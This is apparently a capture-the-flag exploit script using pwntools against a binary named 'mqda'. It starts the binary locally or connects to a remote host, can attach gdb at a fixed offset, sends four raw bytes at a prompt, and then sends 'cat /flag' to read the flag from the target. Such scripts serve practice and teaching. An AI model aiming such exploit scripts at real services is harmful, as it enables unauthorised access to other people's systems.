from pwn import *
import sys

if len(sys.argv) < 2:
    debug = True
else:
    debug = False

if debug:
    p = process("./mqda")
else:
    p = remote(sys.argv[1], sys.argv[2])

context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

def debugf(b):
    if debug:
        gdb.attach(p, "b *$rebase({b})".format(b=hex(b)))

def exp1():
    try:
        debugf(0x00000000000010B0)
        p.recvuntil(b"> ")
        p.send(b"\x21\x23\x89\x33")
        if debug:
            p.interactive()
        else:
            p.sendline("cat /flag")
    except:
        try:
            p.close()
        except:
            pass
        return None

if __name__ == "__main__":
    exp1()
